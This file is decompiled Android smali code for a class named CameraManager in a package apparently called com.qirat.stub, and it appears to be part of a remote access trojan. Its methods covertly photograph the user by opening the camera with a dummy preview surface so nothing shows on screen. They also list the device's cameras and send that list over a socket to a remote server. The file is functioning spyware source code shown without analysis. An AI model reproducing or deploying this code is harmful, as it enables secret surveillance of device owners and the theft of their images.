.class public Lcom/qirat/stub/CameraManager;
.super Ljava/lang/Object;
.source "CameraManager.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "CameraManager"


# instance fields
.field private context:Landroid/content/Context;


# direct methods
.method static bridge synthetic -$$Nest$fgetcontext(Lcom/qirat/stub/CameraManager;)Landroid/content/Context;
    .locals 0

    iget-object p0, p0, Lcom/qirat/stub/CameraManager;->context:Landroid/content/Context;

    return-object p0
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;

    .line 22
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 23
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/qirat/stub/CameraManager;->context:Landroid/content/Context;

    .line 24
    return-void
.end method

.method static synthetic lambda$sendCameraListToServer$1(Landroid/content/Context;)V
    .locals 10
    .param p0, "context"    # Landroid/content/Context;

    .line 121
    const-string v0, "CameraManager"

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    const-string v2, "android.hardware.camera.any"

    invoke-virtual {v1, v2}, Landroid/content/pm/PackageManager;->hasSystemFeature(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 122
    const-string v1, "No camera available"

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 123
    return-void

    .line 126
    :cond_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 127
    .local v1, "cameras":Lorg/json/JSONObject;
    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2}, Lorg/json/JSONArray;-><init>()V

    .line 129
    .local v2, "list":Lorg/json/JSONArray;
    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v3

    .line 130
    .local v3, "numberOfCameras":I
    const/4 v4, 0x0

    .local v4, "i":I
    :goto_0
    if-ge v4, v3, :cond_2

    .line 131
    new-instance v5, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v5}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    .line 132
    .local v5, "info":Landroid/hardware/Camera$CameraInfo;
    invoke-static {v4, v5}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    .line 134
    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    .line 135
    .local v6, "cam":Lorg/json/JSONObject;
    const-string v7, "id"

    invoke-virtual {v6, v7, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 136
    const-string v7, "name"

    iget v8, v5, Landroid/hardware/Camera$CameraInfo;->facing:I

    const/4 v9, 0x1

    if-ne v8, v9, :cond_1

    const-string v8, "Front"

    goto :goto_1

    :cond_1
    const-string v8, "Back"

    :goto_1
    invoke-virtual {v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 137
    invoke-virtual {v2, v6}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 130
    nop

    .end local v5    # "info":Landroid/hardware/Camera$CameraInfo;
    .end local v6    # "cam":Lorg/json/JSONObject;
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 140
    .end local v4    # "i":I
    :cond_2
    const-string v4, "cameraList"

    invoke-virtual {v1, v4, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 142
    invoke-static {p0}, Lcom/qirat/stub/Socket;->getInstance(Landroid/content/Context;)Lcom/qirat/stub/Socket;

    move-result-object v4

    .line 143
    .local v4, "socket":Lcom/qirat/stub/Socket;
    invoke-virtual {v4}, Lcom/qirat/stub/Socket;->isConnected()Z

    move-result v5

    if-eqz v5, :cond_3

    .line 144
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "CAMERA_LIST:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Lcom/qirat/stub/Socket;->sendData(Ljava/lang/String;)V

    .line 145
    const-string v5, "Camera list sent"

    invoke-static {v0, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 149
    .end local v1    # "cameras":Lorg/json/JSONObject;
    .end local v2    # "list":Lorg/json/JSONArray;
    .end local v3    # "numberOfCameras":I
    .end local v4    # "socket":Lcom/qirat/stub/Socket;
    :cond_3
    goto :goto_2

    .line 147
    :catch_0
    move-exception v1

    .line 148
    .local v1, "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error sending camera list: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 150
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_2
    return-void
.end method

.method public static sendCameraListToServer(Landroid/content/Context;)V
    .locals 2
    .param p0, "context"    # Landroid/content/Context;

    .line 119
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/qirat/stub/CameraManager$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/qirat/stub/CameraManager$$ExternalSyntheticLambda0;-><init>(Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 150
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 151
    return-void
.end method


# virtual methods
.method synthetic lambda$takePhoto$0$com-qirat-stub-CameraManager(II)V
    .locals 8
    .param p1, "cameraId"    # I
    .param p2, "quality"    # I

    .line 33
    const-string v0, "CameraManager"

    const/4 v1, 0x0

    .line 36
    .local v1, "camera":Landroid/hardware/Camera;
    :try_start_0
    invoke-static {p1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v2

    move-object v1, v2

    .line 39
    invoke-virtual {v1}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v2

    .line 40
    .local v2, "params":Landroid/hardware/Camera$Parameters;
    invoke-virtual {v2, p2}, Landroid/hardware/Camera$Parameters;->setJpegQuality(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 44
    const/4 v3, 0x0

    .line 45
    .local v3, "smallestSize":Landroid/hardware/Camera$Size;
    :try_start_1
    invoke-virtual {v2}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_2

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/hardware/Camera$Size;

    .line 46
    .local v5, "size":Landroid/hardware/Camera$Size;
    if-eqz v3, :cond_0

    iget v6, v5, Landroid/hardware/Camera$Size;->width:I

    iget v7, v3, Landroid/hardware/Camera$Size;->width:I

    if-ge v6, v7, :cond_1

    .line 47
    :cond_0
    move-object v3, v5

    .line 49
    .end local v5    # "size":Landroid/hardware/Camera$Size;
    :cond_1
    goto :goto_0

    .line 50
    :cond_2
    if-eqz v3, :cond_3

    iget v4, v3, Landroid/hardware/Camera$Size;->width:I

    const/16 v5, 0x140

    if-lt v4, v5, :cond_3

    .line 51
    iget v4, v3, Landroid/hardware/Camera$Size;->width:I

    iget v5, v3, Landroid/hardware/Camera$Size;->height:I

    invoke-virtual {v2, v4, v5}, Landroid/hardware/Camera$Parameters;->setPreviewSize(II)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 55
    .end local v3    # "smallestSize":Landroid/hardware/Camera$Size;
    :cond_3
    goto :goto_1

    .line 53
    :catch_0
    move-exception v3

    .line 54
    .local v3, "e":Ljava/lang/Exception;
    :try_start_2
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Could not set preview size: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v3}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v0, v4}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 57
    .end local v3    # "e":Ljava/lang/Exception;
    :goto_1
    invoke-virtual {v1, v2}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    .line 60
    new-instance v3, Landroid/graphics/SurfaceTexture;

    const/4 v4, 0x0

    invoke-direct {v3, v4}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    .line 61
    .local v3, "dummy":Landroid/graphics/SurfaceTexture;
    invoke-virtual {v1, v3}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    .line 62
    invoke-virtual {v1}, Landroid/hardware/Camera;->startPreview()V

    .line 65
    const-wide/16 v4, 0x12c

    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    .line 67
    move-object v4, v1

    .line 70
    .local v4, "finalCamera":Landroid/hardware/Camera;
    new-instance v5, Lcom/qirat/stub/CameraManager$1;

    invoke-direct {v5, p0, v4}, Lcom/qirat/stub/CameraManager$1;-><init>(Lcom/qirat/stub/CameraManager;Landroid/hardware/Camera;)V

    const/4 v6, 0x0

    invoke-virtual {v1, v6, v6, v5}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 111
    .end local v2    # "params":Landroid/hardware/Camera$Parameters;
    .end local v3    # "dummy":Landroid/graphics/SurfaceTexture;
    .end local v4    # "finalCamera":Landroid/hardware/Camera;
    goto :goto_2

    .line 102
    :catch_1
    move-exception v2

    .line 103
    .local v2, "e":Ljava/lang/Exception;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Error taking photo: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 104
    if-eqz v1, :cond_4

    .line 106
    :try_start_3
    invoke-virtual {v1}, Landroid/hardware/Camera;->release()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 109
    goto :goto_2

    .line 107
    :catch_2
    move-exception v0

    .line 112
    .end local v2    # "e":Ljava/lang/Exception;
    :cond_4
    :goto_2
    return-void
.end method

.method public takePhoto(II)V
    .locals 2
    .param p1, "cameraId"    # I
    .param p2, "quality"    # I

    .line 32
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/qirat/stub/CameraManager$$ExternalSyntheticLambda1;

    invoke-direct {v1, p0, p1, p2}, Lcom/qirat/stub/CameraManager$$ExternalSyntheticLambda1;-><init>(Lcom/qirat/stub/CameraManager;II)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 112
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 113
    return-void
.end method
